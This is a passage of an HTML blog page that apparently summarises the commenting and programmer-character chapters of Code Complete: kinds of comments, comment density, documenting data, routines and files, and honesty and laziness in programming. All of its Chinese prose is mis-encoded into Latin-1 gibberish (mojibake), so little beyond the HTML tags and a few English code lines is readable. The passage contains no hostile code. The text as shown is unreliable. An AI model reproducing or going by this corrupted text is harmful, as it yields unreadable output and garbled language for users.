æ„å›¾è¯´æ˜ã€‚ç›®çš„æ€§æ³¨é‡Šç”¨æ¥æŒ‡æ˜ä¸€æ®µä»£ç çš„æ„å›¾ï¼Œå®ƒæŒ‡å‡ºè¦è§£å†³ä¸ºé—®é¢˜ï¼Œè€Œéè§£å†³çš„æ–¹æ³•ï¼Œå¦‚<code>//get current employee information</code></li><li>ä¼ è¾¾ä»£ç æ— æ³•è¡¨è¾¾çš„ä¿¡æ¯ã€‚æŸäº›ä¿¡æ¯ä¸èƒ½é€šè¿‡ä»£ç æ¥è¡¨è¾¾ï¼Œä½†åˆå¿…é¡»åŒ…å«åœ¨æºä»£ç ä¸­ã€‚è¿™ç§æ³¨é‡ŠåŒ…æ‹¬ç‰ˆæƒå£°æ˜ã€ä¿å¯†è¦æ±‚ã€ç‰ˆæœ¬å·ç­‰æ‚é¡¹ä¿¡æ¯ï¼›ä¸ä»£ç è®¾è®¡æœ‰å…³çš„æ³¨æ„äº‹é¡¹ï¼›ç›¸å…³è¦æ±‚æˆ–è€…æ¶æ„æ–‡ä»¶çš„ç´¢å¼•ï¼›è”æœºå‚è€ƒé“¾æ¥ï¼›ä¼˜åŒ–æ³¨è®°ï¼šè¯¸å¦‚Javadocã€Doxygen ç­‰ç¼–è¾‘å™¨è¦æ±‚æœ‰çš„æ³¨é‡Šï¼Œç­‰ç­‰ã€‚</li></ul><p>å¯¹äºå®Œå·¥çš„ä»£ç ï¼Œåªå…è®¸æœ‰çš„ä¸‰ç§æ³¨é‡Šç±»å‹ï¼šä»£ç æ— æ³•è¡¨è¿°çš„ä¿¡æ¯ã€ç›®çš„æ€§æ³¨é‡Šå’Œæ¦‚è¿°æ€§æ³¨é‡Šã€‚</p><h3 id="é«˜æ•ˆæ³¨é‡Š"><a href="#é«˜æ•ˆæ³¨é‡Š" class="headerlink" title="é«˜æ•ˆæ³¨é‡Š"></a>é«˜æ•ˆæ³¨é‡Š</h3><p>é«˜æ•ˆæ³¨é‡Šå¹¶ä¸è´¹æ—¶ã€‚æ³¨é‡Šå¤ªå¤šå¹¶ä¸æ¯”æ³¨é‡Šå¤ªå°‘å¥½ï¼Œä½ å¾ˆå®¹æ˜“è¾¾åˆ°æŠ˜ä¸­ç‚¹ã€‚</p><p>æ³¨é‡Šå ç”¨å¤ªå¤šæ—¶é—´é€šå¸¸å½’å› äºä¸¤ç‚¹ã€‚ä¸€æ˜¯ï¼Œæ³¨é‡Šçš„é£æ ¼å¯èƒ½è€—æ—¶æˆ–æ¯ç‡¥ä¹å‘³ã€‚å¦‚æœè¿™æ ·ï¼Œè¯·å¦è°‹æ–°çš„é£æ ¼ã€‚éœ€è¦åºå¤§å·¥ä½œé‡çš„æ³¨é‡Šé£æ ¼ç»´æŠ¤èµ·æ¥ä¹Ÿä¼šä»¤äººå¤´ç—›ã€‚å¦‚æœæ³¨é‡Šä¸ä¾¿ä¿®æ”¹ï¼Œäººä»¬å°±ä¸æ„¿æ„ä¿®æ”¹ã€‚äºæ˜¯ä¹ï¼Œæ³¨é‡Šå°±ä¼šå˜å¾—ä¸å‡†ç¡®ï¼Œèµ·åˆ°è¯¯å¯¼ä½œç”¨ï¼Œåè€Œè¿˜ä¸å¦‚æ²¡æœ‰æ³¨é‡Šã€‚äºŒæ˜¯å› ä¸ºè¯´æ˜ç¨‹åºå¹²ä»€ä¹ˆçš„è¯ä¸å¥½æƒ³å‡ºæ¥ï¼Œæ‰€ä»¥å†™æ³¨é‡Šå¤ªéš¾ã€‚è¿™é€šå¸¸æ˜¯ä½ æ²¡æœ‰çœŸæ­£ç†è§£ç¨‹åºçš„ä¿¡å·ã€‚â€œå†™æ³¨é‡Šâ€æ‰€å ç”¨çš„æ—¶é—´å…¶å®éƒ½ç”¨åœ¨äº†æ›´å¥½åœ°ç†è§£ç¨‹åºä¸Šé¢ï¼Œè€Œä¸ç®¡ä½ å†™ä¸å†™æ³¨é‡Šï¼Œè¿™äº›æ—¶é—´æ³¨å®šæ˜¯å¾—èŠ±çš„ã€‚</p><ul><li>ä¸è¦ä½¿ç”¨<code>-</code>ï¼Œ<code>...</code>ç­‰ç¬¦å·æ¥å¯¹é½ä½¿æ³¨é‡Šç¾è§‚ï¼Œåœ¨ä¿®æ”¹è¿™æ ·çš„æ³¨é‡Šæ—¶ä¼šå¹³æ·»å¤§é‡å·¥ä½œã€‚å¦‚æœè¯å¤§é‡æ—¶é—´å¢åˆ æ¨ªçº¿åªæ˜¯ä¸ºäº†å¯¹é½æ³¨é‡Šï¼Œä½ å°±ä¸æ˜¯åœ¨ç¼–ç¨‹ï¼Œè€Œæ˜¯åœ¨æµªè´¹æ—¶é—´ã€‚å»æ‰¾ä¸ªé«˜æ•ˆç‚¹çš„é£æ ¼å§ã€‚æœ‰ä¸ªåŠæ³•æ˜¯é‡‡å–å›ºå®šé•¿åº¦çš„æ¨ªçº¿ï¼Œä¸ç®¡æ³¨é‡Šå†…å®¹æœ‰å¤šé•¿ã€‚è¿™æ ·çš„æ¨ªçº¿ä¸å¿…ç»´æŠ¤ï¼Œè¿˜èƒ½ç”¨ IDE çš„å®å‘½ä»¤æ–¹ä¾¿åœ°æ·»åŠ ã€‚<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">//Variable</span>      Meaning</span><br><span class="line"><span class="string">//--------</span>      <span class="params">-------</span></span><br><span class="line"><span class="string">//xPos</span> <span class="string">........</span> XCorrdinate Position</span><br><span class="line"><span class="string">//yPos</span> <span class="string">........</span> YCorrdinate Position</span><br><span class="line"><span class="string">//psblScrMax</span> <span class="string">..</span> Possible Score Maximum</span><br></pre></td></tr></table></figure></li><li>ç”¨ä¼ªä»£ç ç¼–ç¨‹æ³•å‡å°‘æ³¨é‡Šæ—¶é—´ã€‚å‡å¦‚å†™ä»£ç å‰ä»¥æ³¨é‡Šå…ˆå‹¾å‹’å‡ºä»£ç ï¼Œä½ å°±ä¼šå å°½å…ˆæœºã€‚å®Œæˆä»£ç ä¹‹æ—¥ï¼Œä¹Ÿæ˜¯æ³¨é‡Šå†™å¥½ä¹‹æ—¶ï¼Œä¸å¿…å†å»ä¸“é—¨èŠ±æ—¶é—´æ³¨é‡Šã€‚ç”±äºåœ¨å¡«å……ä½å±‚æ¬¡çš„ç¼–ç¨‹è¯­è¨€ä»£ç å‰ï¼Œå°±å·²å†™å‡ºé«˜å±‚æ¬¡çš„ä¼ªä»£ç ï¼Œå› è€Œå¯ä»¥è·å¾—æ‰€æœ‰è®¾è®¡æ–¹é¢çš„å¥½å¤„ã€‚</li><li>å…»æˆè¾¹å†™ä»£ç è¾¹å†™æ³¨é‡Šçš„å¥½ä¹ æƒ¯ï¼Œè€Œä¸æ˜¯åœ¨ç¼–å†™å®Œä»£ç åå†å»è¡¥æ³¨é‡Š</li><li>æ³¨é‡Šåº”è¡¨è¾¾ä»£ç çš„æ„å›¾</li><li>ä»£ç æœ¬èº«åº”å°½åŠ›åšå¥½è¯´æ˜</li><li>æ³¨é‡Šä»£ç æ®µæ—¶åº”æ³¨é‡â€œä¸ºä½•åšï¼ˆwhyï¼‰â€è€Œä¸æ˜¯â€œæ€ä¹ˆåšï¼ˆhowï¼‰â€</li><li>ç”¨æ³¨é‡Šä¸ºåè¾¹çš„å†…å®¹åšé“ºå«</li><li>è®©æ¯ä¸ªæ³¨é‡Šéƒ½æœ‰ç”¨ã€‚å¤ªå¤šçš„æ³¨é‡Šåªä¼šæŠŠé˜è¿°çš„ä»£ç æå¾—å«æ··ä¸æ¸…ã€‚<strong>ä¸å…¶å†™å¾ˆå¤šæ³¨é‡Šï¼Œä¸å¦‚å¯¹ä»£ç æœ¬èº«çš„å¯è¯»æ€§ä¸‹åŠŸå¤«</strong>ã€‚</li><li>è¯´æ˜éå¸¸è§„åšæ³•ã€‚å¦‚æœä½ ç”¨ä¸å¸¸ç”¨çš„æ–¹æ³•ä»¥æ±‚æå‡æ€§èƒ½ï¼Œè¯·ç”¨æ³¨é‡Šè¯´æ˜å¸¸ç”¨æ–¹æ³•æ˜¯å¦‚ä½•å®ç°ï¼Œå¹¶é‡åŒ–ä½ çš„æ–¹æ³•æå‡äº†å¤šå°‘æ€§èƒ½</li><li>ä¸è¦ä½¿ç”¨ç¼©ç•¥è¯­ã€‚æ³¨é‡Šä¸åº”æœ‰æ­§ä¹‰ï¼Œåº”è¯¥æ˜“è¯»ä¸”æ— éœ€çŒœæµ‹ç¼©å†™çš„å«ä¹‰ã€‚</li></ul><h3 id="æœ€ä½³æ³¨é‡Šé‡"><a href="#æœ€ä½³æ³¨é‡Šé‡" class="headerlink" title="æœ€ä½³æ³¨é‡Šé‡"></a>æœ€ä½³æ³¨é‡Šé‡</h3><p>IBM ç ”ç©¶æŒ‡å‡ºï¼Œçº¦æ¯åæ¡è¯­å¥æœ‰ä¸€ä¸ªæ³¨é‡Šï¼Œè¿™æ ·çš„å¯†åº¦æ—¶ç¨‹åºæ¸…æ™°åº¦æœ€é«˜ï¼Œè¿‡é«˜æˆ–è¿‡ä½çš„ å¯†åº¦éƒ½ä¼šä½¿ä»£ç éš¾ä»¥ç†è§£ã€‚</p><p>å¦‚æœç†Ÿç»ƒè¿ç”¨ä¼ªä»£ç ç¼–ç¨‹æ³•ï¼Œæ—¥ä¹…å¤©é•¿ä½ å°±ä¼šæ¯å‡ è¡Œæœ‰ä¸ªæ³¨é‡Šã€‚ä¸è¿‡ï¼Œæ³¨é‡Šæ•°ç›®å¯¹æ–¹æ³•æœ¬èº«èµ·åˆ°å‰¯ä½œç”¨ã€‚ä¸å…¶æ“å¿ƒæ³¨é‡Šæ•°ç›®ï¼Œå€’ä¸å¦‚å€¾åŠ›äºæ£€æŸ¥æ¯ä¸ªæ³¨é‡Šæœ‰æ— æ•ˆç”¨ã€‚å¦‚æœæ³¨é‡Šè¯´æ˜äº†å†™æŸä»£ç çš„æ¥ç”±ï¼Œåˆç¬¦åˆæœ¬ç« ç¡®ç«‹çš„å„åŸåˆ™ï¼Œè¿™æ ·çš„æ³¨é‡Šå°±è¶³å¤Ÿäº†ã€‚</p><h3 id="æ³¨é‡Šæ•°æ®å£°æ˜"><a href="#æ³¨é‡Šæ•°æ®å£°æ˜" class="headerlink" title="æ³¨é‡Šæ•°æ®å£°æ˜"></a>æ³¨é‡Šæ•°æ®å£°æ˜</h3><ul><li>æ³¨é‡Šæ•°å€¼å•ä½ã€‚å¦‚æœæŸæ•°å€¼è¡¨ç¤ºé•¿åº¦ï¼Œè¯·æŒ‡æ˜é•¿åº¦å•ä½æ˜¯è‹±å¯¸ã€è‹±å°ºã€ç±³è¿˜æ˜¯åƒç±³ã€‚ä¸è¦è§‰å¾—å•ä½ä¸è¨€è‡ªæ˜â€”â€”æ–°æ‰‹ä¸çŸ¥é“ã€‚æ¯”è¾ƒå¥½çš„ä¸€ç§æ–¹å¼æ˜¯ï¼Œå¾ˆå¤šæƒ…å†µä¸‹å¯ä»¥<strong>å°†å•ä½å†™è¿›å˜é‡åï¼Œè€Œä¸å†ç”¨æ³¨é‡Š</strong>ã€‚è¡¨è¾¾å¼<code>distanceToSurface = marsLanderAltidude</code>ä¹Ÿè®¸æ­£ç¡®ï¼Œä½†<code>distanceToSurfaceInMeters = marsLanderAltidudeInFeet</code>åˆ™æ˜æ˜¾ä¸å¯¹ã€‚</li><li>å¯¹æ•°å€¼çš„å…è®¸èŒƒå›´ç»™å‡ºæ³¨é‡Šã€‚å¦‚æœå˜é‡å€¼æœ‰ä¸€ä¸ªæœŸæœ›èŒƒå›´ï¼Œå°±åº”è¯¥è¯´æ˜è¿™ä¸ªèŒƒå›´ã€‚</li><li>æ³¨é‡Šç¼–ç å«ä¹‰ã€‚å¦‚ 1001 è¡¨ç¤ºç”¨æˆ·è®¤è¯é”™è¯¯ï¼Œ1002 è¡¨ç¤ºæœåŠ¡é…ç½®é”™è¯¯ç­‰</li><li>æ³¨é‡Šå¯¹è¾“å…¥æ•°æ®çš„é™åˆ¶ã€‚é‡‡ç”¨è¿™ç§æ–¹æ³•æ›´èƒ½è®©ä»£ç å…·æœ‰è‡ªæ£€èƒ½åŠ›ã€‚</li><li>æ³¨é‡Šâ€œä½æ ‡å¿—â€ã€‚å¦‚æœå˜é‡ç”¨ä½œä½åŸŸï¼Œå°±åº”è¯¥è¯´æ˜æ¯ä¸ªæ•°æ®ä½çš„å«ä¹‰</li><li>æ³¨é‡Šå…¨å±€æ•°æ®ã€‚å¦‚æœä½¿ç”¨äº†å…¨å±€æ•°æ®ï¼Œè¦åœ¨å…¶å£°æ˜å¤„åšå‡ºæ³¨é‡Šã€‚æ³¨é‡Šè¦æŒ‡å‡ºè¯¥æ•°æ®çš„ç›®çš„ã€ä¸ºä½•å¿…é¡»æ˜¯å…¨å±€æ•°æ®ã€‚åœ¨ä½¿ç”¨æ­¤æ•°æ®çš„æ¯ä¸€å¤„ï¼Œéƒ½çªå‡ºå®ƒæ˜¯å…¨å±€æ•°æ®ã€‚å¥½çš„å‘½åè§„èŒƒæ˜¯å‡¸æ˜¾å˜é‡å…¨å±€æ€§çš„é¦–é€‰åŠæ³•ï¼Œå¦‚æœæ¬ ç¼ºè¿™æ ·çš„è§„èŒƒï¼Œåˆ™å¯ä»¥ç”¨æ³¨é‡Šä»£åŠ³ã€‚</li></ul><h3 id="æ³¨é‡Šå­ç¨‹åº"><a href="#æ³¨é‡Šå­ç¨‹åº" class="headerlink" title="æ³¨é‡Šå­ç¨‹åº"></a>æ³¨é‡Šå­ç¨‹åº</h3><ul><li>æ³¨é‡Šåº”é è¿‘å…¶è¯´æ˜çš„ä»£ç </li><li>åœ¨å­ç¨‹åºä¸Šè¾¹ç”¨ä¸€ä¸¤å¥è¯è¯´æ˜ã€‚å¦‚æœä¸èƒ½ç”¨ä¸€ä¸¤å¥è¯è¯´æ¸…æ¥šï¼Œæœ‰å¿…è¦è€ƒè™‘ä½ åˆ°åº•æƒ³è®©å­ç¨‹åºåšä»€ä¹ˆã€‚</li><li>åœ¨å£°æ˜å‚æ•°å¤„æ³¨é‡Šè¿™äº›å‚æ•°ã€‚æ³¨é‡Šå¹¶éè¯´æ˜çš„å”¯ä¸€å½¢å¼ï¼Œå˜é‡åå–çš„è¶³å¤Ÿå¥½å°±èƒ½çœæ‰æ³¨é‡Šã€‚</li><li>åˆ©ç”¨è¯¸å¦‚ Javadoc ä¹‹ç±»çš„ä»£ç è¯´æ˜å·¥å…·</li><li>åˆ†æ¸…è¾“å…¥ä¸è¾“å…¥æ•°æ®</li><li>æ³¨é‡Šæ¥å£å‡è®¾ã€‚å†™å­ç¨‹åºæ—¶ï¼Œè‹¥æ„è¯†åˆ°è‡ªå·±åœ¨åšæ¥å£å‡è®¾ï¼Œåº”ç«‹å³å°†å…¶è®°å½•ä¸‹æ¥</li><li>å¯¹å­ç¨‹åºçš„å±€é™æ€§åšæ³¨é‡Šã€‚å¦‚æœå­ç¨‹åºæä¾›æ•°å€¼ç»“æœï¼Œè¯·æŒ‡å‡ºç»“æœçš„ç²¾ç¡®åº¦ï¼›è¦æ˜¯æŸäº›æ¡ä»¶ä¸‹çš„è®¡ç®—æ²¡æœ‰å®šä¹‰ï¼Œè¯·æ ‡æ³¨è¿™äº›æ¡ä»¶ï¼›å‡å®šå­ç¨‹åºç¢°åˆ°éº»çƒ¦æ—¶æœ‰é»˜è®¤è¡Œä¸ºï¼Œè¯·è¯´æ˜æ­¤è¡Œä¸ºï¼›è‹¥å¸Œæœ›å­ç¨‹åºåªå·¥ä½œäºç‰¹å®šå¤§å°çš„æ•°ç»„æˆ–è¡¨æ ¼ï¼Œè¯·æŒ‡å‡ºè¿™ä¸€æƒ…å†µï¼›å¦‚æœä½ çŸ¥é“å¯¹ç¨‹åºåšæŸäº›ä¿®æ”¹ä¼šæŸåæ­¤å­ç¨‹åºï¼Œè¯·è¯´æ˜æ˜¯å“ªäº›ä¿®æ”¹ï¼›å¦‚è‹¥å¼€å‘å­ç¨‹åºæ—¶æƒ³èµ·ä»€ä¹ˆé—®é¢˜ï¼Œä¹Ÿè¯·æ³¨é‡Šå‡ºæ¥ã€‚</li><li>è¯´æ˜å­ç¨‹åºçš„å…¨å±€æ•ˆæœã€‚å¦‚æœå­ç¨‹åºä¼šä¿®æ”¹å…¨å±€æ•°æ®ï¼Œè¦ç¡®åˆ‡æè¿°å®ƒå¯¹å…¨å±€æ•°æ®åšäº†äº›ä»€ä¹ˆã€‚</li><li>è®°å½•æ‰€ç”¨ç®—æ³•çš„æ¥æºã€‚å¦‚æœç”¨äº†ä»ä¸€æœ¬ä¹¦æˆ–æ‚å¿—ä¸Šå¾—æ¥çš„ç®—æ³•ï¼Œè¯·æ³¨é‡Šå…¶å‡ºå¤„çš„å·å·å’Œé¡µç ã€‚å¦‚æœæ˜¯è‡ªè¡Œå¼€å‘çš„ç®—æ³•ï¼Œè¦æŒ‡å‡ºåœ¨ä½•å¤„è¯»è€…å¯ä»¥æ‰¾åˆ°å¯¹å…¶çš„è§£é‡Šã€‚</li><li>ç”¨æ³¨é‡Šæ ‡è®°ç¨‹åºçš„å„ä¸ªéƒ¨åˆ†</li></ul><h3 id="æ ‡æ³¨ç±»çš„ä¸€èˆ¬åŸåˆ™"><a href="#æ ‡æ³¨ç±»çš„ä¸€èˆ¬åŸåˆ™" class="headerlink" title="æ ‡æ³¨ç±»çš„ä¸€èˆ¬åŸåˆ™"></a>æ ‡æ³¨ç±»çš„ä¸€èˆ¬åŸåˆ™</h3><ul><li>è¯´æ˜å±€é™æ€§ã€ç”¨æ³•å‡è®¾ç­‰</li><li>æ³¨é‡Šç±»æ¥å£ã€‚å…¶ä»–ç¨‹åºå‘˜ä¸çœ‹ç±»å®ç°å°±èƒ½æ˜ç™½ç±»çš„ç”¨æ³•å—ï¼Ÿå¦‚æœä¸æ˜¯ï¼Œç±»çš„å°è£…å°±æœ‰ä¸¥é‡é—®é¢˜ã€‚ç±»æ¥å£åº”è¯¥åŒ…å«åˆ«äººä½¿ç”¨è¯¥ç±»æ—¶æ‰€éœ€çš„å…¨éƒ¨ä¿¡æ¯ã€‚</li><li>ä¸è¦åœ¨ç±»æ¥å£å¤„è¯´æ˜å®ç°ç»†èŠ‚å°è£…ã€‚æœ€é‡è¦çš„ä¸€ä¸ªè§„åˆ™æ˜¯ä»…å…¬å¼€é‚£äº›â€œéœ€è¦ï¼ŒçŸ¥é“â€çš„ä¿¡æ¯ã€‚è‹¥æ‹¿ä¸å®šæ˜¯å¦åº”å…¬å¼€æŸé¡¹ä¿¡æ¯ï¼Œå°±éšè—ä¹‹ã€‚å› æ­¤ï¼Œç±»æ¥å£æ–‡ä»¶åº”å½“åªæœ‰ç±»çš„ç”¨æ³•ä¿¡æ¯ï¼Œè€Œä¸åº”æœ‰éœ€è¦å®ç°æˆ–ç»´æŠ¤ç±»å†…æ“ä½œçš„ä¿¡æ¯ã€‚</li></ul><h3 id="æ³¨é‡Šæ–‡ä»¶çš„ä¸€èˆ¬åŸåˆ™"><a href="#æ³¨é‡Šæ–‡ä»¶çš„ä¸€èˆ¬åŸåˆ™" class="headerlink" title="æ³¨é‡Šæ–‡ä»¶çš„ä¸€èˆ¬åŸåˆ™"></a>æ³¨é‡Šæ–‡ä»¶çš„ä¸€èˆ¬åŸåˆ™</h3><ul><li>è¯´æ˜å„æ–‡ä»¶çš„æ„å›¾å’Œå†…å®¹ã€‚å¦‚æœæ–‡ä»¶åŒ…å«å¤šä¸ªç±»ï¼Œè¯·è§£é‡Šä¸ºä½•è¿™äº›ç±»éœ€è¦æ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚å‡å¦‚å°†ç¨‹åºåˆ’åˆ†ä¸ºå¤šä¸ªæºæ–‡ä»¶å¹¶éå‡ºäºæ¨¡å—åŒ–çš„è€ƒè™‘ï¼Œåˆ™å¯¹å„æ–‡ä»¶ç”¨æ„çš„è¯´æ˜å°†å¯¹ä¿®æ”¹ç¨‹åºçš„ç¨‹åºå‘˜æ›´æœ‰å¸®åŠ©ã€‚å¦‚æœåˆ«äººè¦æ‰¾å‡ºåšæŸäº‹çš„å­ç¨‹åºåœ¨å“ªå„¿ï¼Œæ–‡ä»¶å¤´æ³¨é‡Šæœ‰åŠ©äºç¡®å®šè¯¥æ–‡ä»¶å«ä¸å«æ­¤å­ç¨‹åºå—ï¼Ÿ</li><li>å°†å§“åã€é‚®ä»¶åŠç”µè¯å·ç ç­‰æ”¾åˆ°æ³¨é‡Šå—ä¸­</li><li>åŒ…å«ç‰ˆæœ¬æ§åˆ¶æ ‡è®°</li><li>å°†æ–‡ä»¶å‘½åä¸ºä¸å…¶å†…å®¹ç›¸å…³çš„åå­—</li></ul><p>Key Points</p><ul><li>è¯¥ä¸è¯¥æ³¨é‡Šæ˜¯ä¸ªéœ€è¦è®¤çœŸå¯¹å¾…çš„é—®é¢˜ã€‚å·®åŠ²çš„æ³¨é‡Šåªä¼šæµªè´¹æ—¶é—´ï¼Œå¸®å€’å¿™ï¼›å¥½çš„æ³¨é‡Šæ‰æœ‰ä»·å€¼ã€‚</li><li>æºä»£ç åº”å½“å«æœ‰ç¨‹åºå¤§éƒ¨åˆ†çš„å…³é”®ä¿¡æ¯ã€‚åªè¦ç¨‹åºä¾ç„¶åœ¨ç”¨ï¼Œæºä»£ç æ¯”å…¶ä»–èµ„æ–™éƒ½èƒ½ä¿æŒæ›´æ–°ï¼Œæ•…è€Œå°†é‡è¦ä¿¡æ¯èå…¥ä»£ç æ˜¯å¾ˆæœ‰ç”¨å¤„çš„ã€‚</li><li>å¥½ä»£ç æœ¬èº«å°±æ˜¯æœ€å¥½çš„è¯´æ˜ã€‚å¦‚æœä»£ç å¤ªç³Ÿï¼Œéœ€è¦å¤§é‡æ³¨é‡Šï¼Œåº”å…ˆè¯•ç€æ”¹è¿›ä»£ç ï¼Œç›´è‡³æ— é¡»è¿‡å¤šæ³¨é‡Šä¸ºæ­¢ã€‚</li><li>æ³¨é‡Šåº”è¯´å‡ºä»£ç æ— æ³•è¯´å‡ºçš„ä¸œè¥¿â€”â€”ä¾‹å¦‚æ¦‚è¿°æˆ–ç”¨æ„ç­‰ä¿¡æ¯ã€‚</li><li>æœ‰çš„æ³¨é‡Šé£æ ¼éœ€è¦è®¸å¤šé‡å¤æ€§åŠ³åŠ¨ï¼Œåº”èˆå¼ƒä¹‹ï¼Œæ”¹ç”¨æ˜“äºç»´æŠ¤çš„æ³¨é‡Šé£æ ¼ã€‚</li></ul><h2 id="ç¬¬33ç« -ä¸ªäººæ€§æ ¼"><a href="#ç¬¬33ç« -ä¸ªäººæ€§æ ¼" class="headerlink" title="ç¬¬33ç«  ä¸ªäººæ€§æ ¼"></a>ç¬¬33ç«  ä¸ªäººæ€§æ ¼</h2><p><strong>ä»£ç æ˜¯70%çš„æ—¶é—´åœ¨é˜…è¯»ï¼Œ30%çš„æ—¶é—´åœ¨è¿è¡Œï¼›20%çš„æ—¶é—´åœ¨å¼€å‘ï¼Œ80%çš„æ—¶é—´åœ¨ç»´æŠ¤ã€‚</strong><br>ç¼–ç¨‹é¦–å…ˆæ˜¯ä¸äººäº¤æµï¼Œå…¶æ¬¡æ‰æ˜¯ä¸è®¡ç®—æœºäº¤æµã€‚</p><p>ä¸è¦ç”¨8å°æ—¶æ¥ç»´æŠ¤2å°æ—¶ä¸åœ¨çŠ¶æ€æ—¶å†™çš„ä»£ç ã€‚</p><p>æ‰¿è®¤è‡ªå·±çš„æ™ºåŠ›æœ‰é™å¹¶é€šè¿‡å­¦ä¹ æ¥å¼¥è¡¥ï¼Œä½ ä¼šæˆä¸ºæ›´å¥½çš„ç¨‹åºå‘˜ã€‚<strong>ä½ è¶Šæ˜¯è°¦è™šï¼Œè¿›æ­¥å°±è¶Šå¿«</strong>ã€‚</p><p>ç»è¿‡å¤§é‡è€Œé•¿æœŸçš„é›¶é›¶ç¢ç¢çš„å·¥ä½œï¼Œæˆ‘ä»¬æ‰æˆä¸ºå®è·µä¸ç§‘å­¦é¢†åŸŸçš„æƒå¨ä¸“å®¶ã€‚å¦‚æœä½ èƒ½<strong>æ»¡æ€€ä¿¡å¿ƒåœ°æ¯å¤©è¾›å‹¤å·¥ä½œ</strong>ï¼Œæ—©æ™šæœ‰ä¸€å¤©ä¼šå‘ç°è‡ªå·±å·²æˆä¸ºè¿™ä»£äººçš„ä½¼ä½¼è€…ã€‚    â€” å¨å»‰ Â· è©¹å§†æ–¯</p><p>çŠ¯é”™ä¸æ˜¯ç½ªè¿‡ï¼Œä»ä¸­å­¦ä¸åˆ°ä»€ä¹ˆæ‰æ˜¯ç½ªè¿‡ã€‚</p><p>å­¦ä¹ ç¼–ç¨‹çš„ä¸€ä¸ªç‰¹åˆ«å¥½çš„é€”å¾„æ˜¯ç ”ç©¶é«˜æ‰‹çš„ç¨‹åºã€‚</p><p>æŠ€æœ¯å¸¦å¤´äººä¼šä¸ºäººå†™ä»£ç ï¼Œè€Œéæœºå™¨ã€‚çœŸæ­£çš„é«˜æ‰‹æ‰€å†™çš„ä»£ç ï¼Œåƒæ°´æ™¶ä¸€æ ·æ™¶è¹å‰”é€ï¼Œè¿˜é…æœ‰æ–‡æ¡£ã€‚ä»–ä»¬å¯ä¸ä¼šæµªè´¹å…¶å®è´µçš„è„‘åŠ›ï¼Œå»é‡æ–°ç»„ç»‡ç”¨ä¸€å¥æ³¨é‡Šå°±èƒ½è¯´æ¸…æ¥šçš„æŸå—ä»£ç é€»è¾‘ã€‚</p><p>è¯šå®ï¼š</p><ul><li>ä¸æ˜¯é«˜æ‰‹æ—¶ä¸è¦å‡è£…æ˜¯é«˜æ‰‹<ul><li>ï¼ˆå¦‚æœä½ ä¸æ‡‚è£…æ‡‚ï¼Œè¿˜æ€ä¹ˆå­¦ä¹ æ–°ä¸œè¥¿å‘¢ï¼Ÿæœ€å¥½è¿˜æ˜¯è£…ä½œè‡ªå·±å•¥éƒ½ä¸æ‡‚ï¼Œå¬å¬åˆ«äººå’‹è¯´ï¼Œä»ä»–ä»¬é‚£é‡Œå­¦åˆ°æ–°å†…å®¹ï¼Œå¹¶èƒ½äº†è§£ä»–ä»¬æ˜¯å¦çœŸçš„æ¸…æ¥šæ‰€è®¨è®ºçš„ä¸œè¥¿ï¼‰</li></ul></li><li>ä¹äºæ‰¿è®¤é”™è¯¯</li><li>åŠ›å›¾ç†è§£ç¼–è¯‘å™¨çš„è­¦å‘Šï¼Œè€Œéç½®ä¹‹ä¸ç†</li><li>é€å½»ç†è§£è‡ªå·±çš„ç¨‹åºï¼Œè€Œä¸è¦åªæ˜¯ç¼–è¯‘çœ‹çœ‹èƒ½å¦è¿è¡Œ<ul><li>ï¼ˆè¯·ç¡®ä¿åœ¨å°†ç¨‹åºä¸¢ç»™ç¼–è¯‘å™¨ä¹‹å‰ï¼Œä½ å·²ç»å¯¹å…¶æœ‰äº†è¾ƒå¤§çš„æŠŠæ¡ï¼‰</li></ul></li><li>æä¾›å®é™…çš„çŠ¶å†µæŠ¥å‘Š</li><li>æä¾›æ˜¾ç¤ºçš„è¿›åº¦æ–¹æ¡ˆï¼Œåœ¨ä¸Šå¸é¢å‰åšæŒè‡ªå·±çš„æ„è§<ul><li>ï¼ˆè®¤çœŸè¯„ä¼°é¡¹ç›®æ‰€éœ€æ—¶é—´ï¼Œå°†çœŸå®æƒ…å†µæ±‡æŠ¥ï¼Œå¦‚æœä¸Šå¸è¦æ±‚ç¼©çŸ­æ—¶é—´ï¼Œè¯·åšæŒè‡ªå·±çš„æ„è§ï¼Œè¦ä¹ˆæŠ•å…¥æ›´å¤šçš„äººåŠ›ï¼Œè¦ä¹ˆå»æ‰ä¸€éƒ¨åˆ†åŠŸèƒ½ï¼‰</li></ul></li></ul><p>å·æ‡’è¡¨ç°åœ¨ä¸€ä¸‹æ–¹é¢ï¼š</p><ul><li>æ‹–å»¶ä¸å–œæ¬¢çš„ä»»åŠ¡</li><li>è¿…é€Ÿåšå®Œä¸å–œæ¬¢çš„ä»»åŠ¡ï¼Œä»¥æ‘†è„±ä¹‹</li><li>ç¼–å†™æŸä¸ªå·¥å…·æ¥å®Œæˆä¸å–œæ¬¢çš„ä»»åŠ¡ï¼Œä»¥ä¾¿å†ä¹Ÿä¸ç”¨åšè¿™æ ·çš„äº‹æƒ…äº†<ul><li>ä¸€åŠ³æ°¸é€¸çš„æ‡’ï¼Œæ— ç–‘æ˜¯æœ€å…·äº§å€¼çš„å·æ‡’å½¢å¼</li></ul></li></ul><p><strong>æœ‰æ•ˆç¼–ç¨‹ä¸­æœ€é‡è¦çš„å·¥ä½œæ˜¯<em>æ€è€ƒ</em></strong>ï¼Œè€Œäººæ€è€ƒæ—¶é€šå¸¸çœ‹ä¸Šå»ä¸ä¼šå¾ˆå¿™ï¼Œå¦‚æœå’Œæˆ‘å…±äº‹çš„ç¨‹åºå‘˜æ€»æ˜¯å¿™ä¸ªä¸åœï¼Œæˆ‘ä¼šè®¤ä¸ºä»–å¹¶éä¼˜ç§€çš„ç¨‹åºå‘˜ï¼Œå› ä¸ºä»–æ²¡æœ‰ç”¨æœ€æœ‰ä»·å€¼çš„å·¥å…·â€”â€”è‡ªå·±çš„è„‘è¢‹ã€‚</p><p>å¤šæ•°æ—¶å€™è½¯ä»¶å¼€å‘ä¸­åšæŒå…¶å®å°±æ˜¯æ²¡æœ‰å¥½å¤„çš„â€œå›ºæ‰§â€ã€‚å½“åœ¨æŸæ®µæ–°ä»£ç 